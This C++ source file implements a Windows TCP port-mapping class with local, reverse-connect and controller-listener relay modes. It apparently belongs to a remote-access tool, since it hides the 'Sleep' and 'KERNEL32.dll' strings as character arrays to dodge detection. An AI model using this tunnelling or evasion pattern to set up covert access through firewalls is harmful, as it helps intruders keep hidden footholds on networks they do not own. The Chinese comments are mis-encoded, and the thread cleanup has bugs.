// ZXPortMap.cpp: implementation of the CZXPortMap class.
//
//////////////////////////////////////////////////////////////////////
#include "pch.h"
#include "ZXPortMap.h"

#include <stdio.h>
#ifdef _DEBUG
#define new DEBUG_NEW
#endif

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

SOCKET CZXPortMap::SocketNum[1024]={0};
int CZXPortMap::nSocket=0;
int CZXPortMap::nTimes=0;
HANDLE CZXPortMap::hThreadPort[1024]={0};
bool CZXPortMap::bIsRunning = false;
int CZXPortMap::nThreadNum = 0;
extern BYTE bSerStat[128];

CZXPortMap::CZXPortMap()
{
//	d("CZXPortMap");
//	StringTab stCmd;
//	stCmd = StringSplit_Struct(strCmd.GetBuffer(0), "|");

//	CString str;
//	str.Format("%d", stCmd.number);
//	AfxMessageBox(str);
// 	switch(stCmd.number)
// 	{
// 	case 0:
// 		break;
// 	case 1:
// 		break;
// 	case 2:
// 		break;
// 	default:
// 		AfxMessageBox("error");
// 	}
	nCtrlPort = 0;
	nServerPort = 0;
}

CZXPortMap::~CZXPortMap()
{
//	d("~CZXPortMap");
//	AfxMessageBox("~CZXPortMap");
}

int CZXPortMap::DataSend(SOCKET s, char *DataBuf, int DataLen)//��DataBuf�е�DataLen���ֽڷ���sȥ
{
	int nBytesLeft = DataLen;
	int nBytesSent = 0;
	int ret;
	//set socket to blocking mode
	int iMode = 0;
	ioctlsocket(s, FIONBIO, (u_long FAR*) &iMode);
	while(nBytesLeft > 0)
	{
		ret = send(s, DataBuf + nBytesSent, nBytesLeft, 0);
		if(ret <= 0)
			break;
		nBytesSent += ret;
		nBytesLeft -= ret;
	}
	return nBytesSent;
}

DWORD WINAPI CZXPortMap::TransmitData(LPVOID lParam)//������SOCKET�н�������ת��
{
	SOCKINFO socks = *((SOCKINFO*)lParam);
	SOCKET ClientSock = socks.ClientSock;
	SOCKET ServerSock = socks.ServerSock;
	char RecvBuf[MAXBUFSIZE] = {0};
	fd_set Fd_Read;
	int ret, nRecv;
	
	while(bIsRunning)
	{
		FD_ZERO(&Fd_Read);
		FD_SET(ClientSock, &Fd_Read);
		FD_SET(ServerSock, &Fd_Read);
		ret = select(0, &Fd_Read, NULL, NULL, NULL);
		if(ret <= 0)
			goto error;
		if(FD_ISSET(ClientSock, &Fd_Read))
		{
			nRecv = recv(ClientSock, RecvBuf, sizeof(RecvBuf), 0);
			if(nRecv <= 0)
				goto error;
			ret = DataSend(ServerSock, RecvBuf, nRecv);
			if(ret == 0 || ret != nRecv)
				goto error;
		}
		if(FD_ISSET(ServerSock, &Fd_Read))
		{
			nRecv = recv(ServerSock, RecvBuf, sizeof(RecvBuf), 0);
			if(nRecv <= 0)
				goto error;
			ret = DataSend(ClientSock, RecvBuf, nRecv);
			if(ret == 0 || ret != nRecv)
				goto error;
		}
	}
	
error:
	closesocket(ClientSock);
	closesocket(ServerSock);
	return 0;
}

SOCKET CZXPortMap::ConnectHost(DWORD dwIP, WORD wPort)//����ָ��IP�Ͷ˿�
{
	SOCKET sockid;
	
	if ((sockid = socket(AF_INET,SOCK_STREAM,0)) == INVALID_SOCKET)
		return 0;
	struct sockaddr_in srv_addr;
	srv_addr.sin_family = AF_INET;
	srv_addr.sin_addr.S_un.S_addr = dwIP;
	srv_addr.sin_port = htons(wPort);
	if (connect(sockid,(struct sockaddr*)&srv_addr,sizeof(struct sockaddr_in)) == SOCKET_ERROR)
		goto error;
	return sockid;
error:
	closesocket(sockid);
	return 0;
}

SOCKET CZXPortMap::ConnectHost(char *szIP, WORD wPort)
{	
	return ConnectHost(inet_addr(szIP), wPort);
}

SOCKET CZXPortMap::CreateSocket(DWORD dwIP, WORD wPort)//��dwIP�ϰ�wPort�˿�
{
	SOCKET sockid;
	
	if ((sockid = socket(AF_INET,SOCK_STREAM,0)) == INVALID_SOCKET)
		return 0;
	struct sockaddr_in srv_addr = {0};
	srv_addr.sin_family = AF_INET;
	srv_addr.sin_addr.S_un.
		S_addr = dwIP;
	srv_addr.sin_port = htons(wPort);
	if (bind(sockid,(struct sockaddr*)&srv_addr,sizeof(struct sockaddr_in)) == SOCKET_ERROR)
		goto error;
	listen(sockid,3);
	SocketNum[++nSocket] = sockid;
	return sockid;
error:
	closesocket(sockid);
	return 0;
}

SOCKET CZXPortMap::CreateTmpSocket(WORD *wPort)//����һ����ʱ���׽���,ָ��wPort��ô�������ʱ�˿�
{
	struct sockaddr_in srv_addr = {0};
	int addrlen = sizeof(struct sockaddr_in);
	
	SOCKET s = CreateSocket(INADDR_ANY, 0);
	if(s <= 0)
		goto error;
	
	if(getsockname(s, (struct sockaddr*)&srv_addr, &addrlen) == SOCKET_ERROR)
		goto error;
	*wPort =ntohs(srv_addr.sin_port);
	return s;
error:
	closesocket(s);
	return 0;
}

BOOL CZXPortMap::InitSocket()
{
	WSADATA wsadata;
	return WSAStartup(MAKEWORD(2,2),&wsadata) == 0;
}

DWORD WINAPI CZXPortMap::PortTransfer_1(LPVOID lParam)
{
	TransferParam<ADDRESS, SOCKET> *ConfigInfo = (TransferParam<ADDRESS, SOCKET>*)lParam;
	SOCKET ClientSock, ServerSock;
	
	//��ջ����ÿͻ����׽���
	ClientSock = ConfigInfo->LocalData.Pop();
	//printf("ThreadID: %d ==> Now Connecting To Server...", nTimes);
	//�����ӵ�Ŀ�������ķ���
	ServerSock = ConnectHost(ConfigInfo->GlobalData.szIP, ConfigInfo->GlobalData.wPort);
	if(ServerSock <= 0)
	{
		///printf("Error.\r\n");
		closesocket(ClientSock);
		return 0;
	}
	//printf("OK.\r\nStarting TransmitData\r\n");
	SOCKINFO socks;
	socks.ClientSock = ClientSock;//�ͻ����׽���
	socks.ServerSock = ServerSock;//Ŀ������������׽���
	//���봿����ת��״̬
	return TransmitData((LPVOID)&socks);
}

BOOL CZXPortMap::PortTransfer_1(WORD ListenPort, char *szIP, WORD wPort)
{
//	HANDLE hThread;
	DWORD dwThreadId;
	SOCKET AcceptSocket;
	
	TransferParam<ADDRESS, SOCKET> ConfigInfo;
	
	_snprintf(ConfigInfo.GlobalData.szIP, ADDRSIZE, "%s", szIP);
	ConfigInfo.GlobalData.wPort = wPort;
	
	//����������˿ڣ���ӳ��˿�
	SOCKET localsockid = CreateSocket(INADDR_ANY, ListenPort);
	if(localsockid <= 0)
		goto error;
	while(bIsRunning)
	{
		//printf("Accepting new Client...");
		AcceptSocket = accept(localsockid, NULL, NULL);
		if(AcceptSocket == INVALID_SOCKET)
			goto error;
		nTimes++;
		//printf("OK.\r\n");
		//�����ܵ��Ŀͻ������׽���ת���µ��߳��ﴦ��
		//Ȼ������ȴ��µ�����
		ConfigInfo.LocalData.Push(AcceptSocket);
		hThreadPort[++nThreadNum] = CreateThread(NULL, 0, PortTransfer_1, (LPVOID)&ConfigInfo, NULL, &dwThreadId);
		if(hThreadPort[nThreadNum])
			CloseHandle(hThreadPort[nThreadNum]);
		else
			Sleep(1000);
		
	}
error:
	//printf("Error.\r\n");
	closesocket(localsockid);
	return false;
}

DWORD WINAPI CZXPortMap::PortTransfer_2(LPVOID lParam)
{
	TransferParam<ADDRESS, WORD> *ConfigInfo = (TransferParam<ADDRESS, WORD> *)lParam;
	SOCKET CtrlSocket = ConfigInfo->GlobalData.s;
	DWORD dwCtrlIP;
	//WORD wPort;
	SOCKADDR_IN clientaddr;
	int addrlen = sizeof(clientaddr);
	//֮ǰ�ô��˸�API(getsockname),����Ӧ����getpeername
	if(getpeername(CtrlSocket, (SOCKADDR *)&clientaddr, &addrlen) == SOCKET_ERROR)
		return 0;
	//�������PortTransfer_3ģʽ�ļ������IP
	dwCtrlIP = clientaddr.sin_addr.S_un.S_addr;
	//wPort = ntohs(clientaddr.sin_port);
	
	SOCKET ClientSocket, ServerSocket;
	SOCKINFO socks;
	//printf("ThreadID: %d ==> Connecting to Client...", nTimes);
	//���������µ�����
	ClientSocket = ConnectHost(dwCtrlIP, ConfigInfo->LocalData.Pop());
	if(ClientSocket <= 0)
		return 0;
//	printf("OK.\r\n");
//	printf("ThreadID: %d ==> Connect to Server...", nTimes);
	//���ӵ�Ŀ�������ķ���
	ServerSocket = ConnectHost(ConfigInfo->GlobalData.szIP, ConfigInfo->GlobalData.wPort);
	if(ServerSocket <= 0)
	{
		//printf("Error.\r\n");
		closesocket(ClientSocket);
		return 0;
	}
//	printf("OK.\r\nStarting TransmitData\r\n", nTimes);
	socks.ClientSock = ClientSocket;//������������׽���
	socks.ServerSock = ServerSocket;//Ŀ������������׽���
	//���봿����ת��״̬
	return TransmitData((LPVOID)&socks);
}

BOOL CZXPortMap::PortTransfer_2(char *szCtrlIP, WORD wCtrlPort, char *szIP, WORD wPort)
{
	int nRecv;
	WORD ReqPort;
//	HANDLE hThread;
	DWORD dwThreadId;
	TransferParam<ADDRESS, WORD> ConfigInfo;
	_snprintf(ConfigInfo.GlobalData.szIP, ADDRSIZE, "%s", szIP);
	ConfigInfo.GlobalData.wPort = wPort;
	
	//printf("Creating a ctrlconnection...");
	//��PortTransfer_3ģʽ�������ڹ������ļ�����������ƹܵ�����
	SOCKET CtrlSocket = ConnectHost(szCtrlIP, wCtrlPort);
	if(CtrlSocket <= 0)
		goto error;
	ConfigInfo.GlobalData.s = CtrlSocket;
	//printf("OK.\r\n");
	while(bIsRunning)
	{
		//�������ԣ������ڹ�������������������Ϊһ��WORD��
		//��ʾ�������������������˿�
		nRecv = recv(CtrlSocket, (char*)&ReqPort, sizeof(ReqPort), 0);
		if(nRecv <= 0)
			goto error;
		nTimes++;
		ConfigInfo.LocalData.Push(ReqPort);//������Ϣ�Ľṹ
		hThreadPort[++nThreadNum] = CreateThread(NULL, 0, PortTransfer_2, (LPVOID)&ConfigInfo, NULL, &dwThreadId);
		if(hThreadPort[nThreadNum])
			CloseHandle(hThreadPort[nThreadNum]);
		else
			Sleep(1000);
	}
error:
//	printf("Error.\r\n");
	closesocket(CtrlSocket);
	return false;
}

DWORD WINAPI CZXPortMap::PortTransfer_3(LPVOID lParam)
{
	SOCKINFO socks;
	SOCKET ClientSocket, ServerSocket, CtrlSocket, tmpSocket;
	TransferParam<SOCKET, SOCKET> *ConfigInfo = (TransferParam<SOCKET, SOCKET>*)lParam;
	CtrlSocket = ConfigInfo->GlobalData;
	ClientSocket = ConfigInfo->LocalData.Pop();
	
	WORD wPort;
	tmpSocket = CreateTmpSocket(&wPort);//��������ʱ�˿�
	
	if(tmpSocket <= 0 || wPort <= 0)
	{
		closesocket(ClientSocket);
		return 0;
	}
	//֪ͨ�����û������µ����ӵ��մ�������ʱ�˿�
	if(send(CtrlSocket, (char*)&wPort, sizeof(wPort), 0) == SOCKET_ERROR)
	{
		closesocket(ClientSocket);
		closesocket(CtrlSocket);
		return 0;
	}
	//printf("ThreadID: %d ==> Waiting for server connection...", nTimes);
	ServerSocket = accept(tmpSocket, NULL, NULL);
	if(ServerSocket == INVALID_SOCKET)
	{
		//printf("Error.\r\n");
		closesocket(ClientSocket);
		return 0;
	}
	//printf("OK.\r\n");
	socks.ClientSock = ClientSocket;
	socks.ServerSock = ServerSocket;
	//���봿����ת��״̬
	return TransmitData((LPVOID)&socks);
}

BOOL CZXPortMap::PortTransfer_3(WORD wCtrlPort, WORD wServerPort)//�����������˿�
{
	DWORD dwThreadId;
	BOOL bOptVal = TRUE;
	int bOptLen = sizeof(BOOL);
	TransferParam<SOCKET, SOCKET> ConfigInfo;
	SOCKET ctrlsockid, serversockid, CtrlSocket, AcceptSocket;
	
	ctrlsockid = CreateSocket(INADDR_ANY, wCtrlPort);//�����׽���
	if(ctrlsockid <= 0)
		goto error2;
	serversockid = CreateSocket(INADDR_ANY, wServerPort);//�����׽���
	if(serversockid <= 0)
		goto error1;
	
	int nSockAddrLen;
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	nSockAddrLen = sizeof(sockAddr);
	getsockname(ctrlsockid, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	
	nCtrlPort=ntohs(sockAddr.sin_port);

	memset(&sockAddr, 0, sizeof(sockAddr));
	nSockAddrLen = sizeof(sockAddr);
	getsockname(serversockid, (SOCKADDR*)&sockAddr, &nSockAddrLen);

	nServerPort=ntohs(sockAddr.sin_port);

	CtrlSocket = accept(ctrlsockid, NULL, NULL);//�������ԣ������û�����PortTransfer_2ģʽ�������ƹܵ����ӵ�����
	if(CtrlSocket == INVALID_SOCKET)
		goto error0;
	//setsockopt( keep-alive......
	if (setsockopt(CtrlSocket, SOL_SOCKET, SO_KEEPALIVE, (char*)&bOptVal, bOptLen) == SOCKET_ERROR) {
		goto error0;
		//printf("Set SO_KEEPALIVE: ON\n");
	}

	//�������û����������Ӻ���൱�˿�ӳ��ɹ���
	//׼��������շ�������״̬��������������߳���ͨ�����ƹܵ�֪ͨ�����û������µ����ӽ�������ת��
	ConfigInfo.GlobalData = CtrlSocket;
	while(bIsRunning)
	{
		//printf("Accepting new Client...\r\n");
		AcceptSocket = accept(serversockid, NULL, NULL);
		if(AcceptSocket == INVALID_SOCKET)
		{
			//printf("Error.\r\n");
			Sleep(1000);
			continue;
		}
		nTimes++;
		//printf("OK.\r\n");
		ConfigInfo.LocalData.Push(AcceptSocket);//�ѽ��ܵ����׽���Push��ջ�ṹ�У����������߳��Ǳ߿�����Pop����
		hThreadPort[++nThreadNum] = CreateThread(NULL, 0, PortTransfer_3, (LPVOID)&ConfigInfo, NULL, &dwThreadId);
		if(hThreadPort[nThreadNum])
			CloseHandle(hThreadPort[nThreadNum]);
		else
			Sleep(1000);
	}
	
error0:
	closesocket(CtrlSocket);
error1:
	closesocket(serversockid);
error2:
	closesocket(ctrlsockid);
	return false;
}

void CZXPortMap::Stop()
{
	
	bIsRunning = false;
	typedef VOID (WINAPI *SleepT)
		(
		__in DWORD dwMilliseconds
		);
	char tcGad[] = {'S','l','e','e','p','\0'};
	char bDKZD[] = {'K','E','R','N','E','L','3','2','.','d','l','l','\0'};
	SleepT pSleep = (SleepT)GetProcAddress(LoadLibrary(bDKZD),tcGad);

	pSleep(100);
	char szMsg[128];
	while(nSocket)
	{
//		d("while1");
		wsprintf(szMsg, "nsocket-di:%d", nSocket);
//		d(szMsg);
		if(SocketNum[nSocket]!=INVALID_SOCKET)
		{
			closesocket(SocketNum[nSocket]);
//			d("close socket");
		}
		nSocket--;
	}
// 	do
// 	{
// 		if(SocketNum[nSocket]!=INVALID_SOCKET)
// 		{
// 			closesocket(SocketNum[nSocket]);
// 			d("close socket");
// 		}
// 		d("while1");
// 	}while(nSocket--+1);

//	d("xxxx");

	while(nThreadNum)
	{

//		wsprintf(szMsg, "nThreadNum-di:%d", nThreadNum);
//		d(szMsg);
		if(hThreadPort[nThreadNum] != INVALID_HANDLE_VALUE)
		{
//			d("TermailThread");
			TerminateThread(hThreadPort[nThreadNum], 0);
			CloseHandle(hThreadPort);
		}
		nThreadNum--;
//		d("while2");
	}
//	d("endxx");

// 	do
// 	{
// 		d("while2");
// 		if(hThreadPort[nThreadNum+1]!=INVALID_HANDLE_VALUE)
// 		{
// 			d("TermailThread");
// 			TerminateThread(hThreadPort[nThreadNum+1], 0);
// 			CloseHandle(hThreadPort);
// 		}
// 	}while(nThreadNum--+1);
//	SocketNum[1024]={0};
//	memset(SocketNum[1024], 0, sizeof(SocketNum)*1024);
//	SocketNum[1024] = {0};
	nThreadNum = 0;
	nSocket = 0;
//	hThreadPort[1024] = {0};
	//memset(hThreadPort,)

	bIsRunning = true;
}